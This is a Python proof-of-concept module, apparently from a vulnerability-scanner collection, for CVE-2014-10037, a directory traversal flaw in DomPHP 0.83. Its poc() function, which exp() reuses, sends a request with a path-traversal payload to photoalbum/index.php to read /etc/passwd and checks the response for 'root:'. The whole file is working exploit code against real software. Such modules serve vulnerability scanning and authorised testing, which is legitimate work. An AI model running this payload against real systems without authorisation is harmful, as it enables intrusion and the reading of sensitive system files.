import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''DomPHP 0.83 - Directory Traversal''',
        "description": '''A directory traversal vulnerability in DomPHP 0.83 and earlier allows remote attackers to have unspecified impacts via a .. (dot dot) in the url parameter to photoalbum/index.php.''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/30865", 
            "https://www.cvedetails.com/cve/CVE-2014-10037", 
            "https://nvd.nist.gov/vuln/detail/CVE-2014-10037"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "CVE-2014-10037",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2014", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/photoalbum/index.php?urlancien=&url=../../../../../../../../../../../../etc/passwd%00'

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "root:" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url